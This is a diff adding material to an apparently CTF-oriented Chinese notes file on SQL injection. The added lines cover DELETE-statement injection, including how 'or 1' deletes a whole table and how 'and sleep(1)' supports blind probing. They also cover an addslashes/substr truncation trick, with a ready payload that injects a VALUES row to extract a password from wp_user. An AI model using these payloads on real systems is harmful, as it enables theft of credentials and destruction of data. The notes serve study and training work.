@@ -380,6 +380,23 @@ username=1',(select group_concat(flagass23s3) from flag))%23&password=1
 0||if(substr((select flag from flag),{i},1)="{j}",sleep(1),0)
 ```
 
+delete注入容易把一张表全部删除
+
+```sql
+delete from some_table where id = 1 or 1;
+```
+
+如上，当where后面的值为True时，会删除整张表
+
+应该加一个`and sleep(1)`确保返回为假
+
+```sql
+delete from some_table where id = 1 and sleep(1);
+```
+
+然后再考虑盲注
+
+
 ## update注入
 
 ```sql
@@ -523,6 +540,26 @@ FLUSH TABLES WITH READ LOCK
 执行了命令之后所有库所有表都被锁定只读。此时操作表会报错
 
 解锁的语句是`unlock tables`
+
+**字符串截断**
+
+```php
+$title = addslashes($_GET['title']);//addslashes() 函数返回在预定义字符之前添加反斜杠的字符串
+$title = substr($title, 0, 10);
+$sql="INSERT INTO wp_news VALUES(2, '$title', '$content')";
+```
+
+变量title被截取过10个字符，如果输入`aaaaaaaaa'`，会自动转义成`aaaaaaaaa\'`，截取后结果变成`aaaaaaaaa\`
+
+```php
+INSERT INTO some_table VALUES(2, 'aaaaaaaaa\', '$content')
+```
+
+正好转义单引号，我们就可以在变量content中注入了，可以用VALUES注入
+
+```php
+?title=aaaaaaaaa'&content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#
+```
 
 ## 二次注入
 
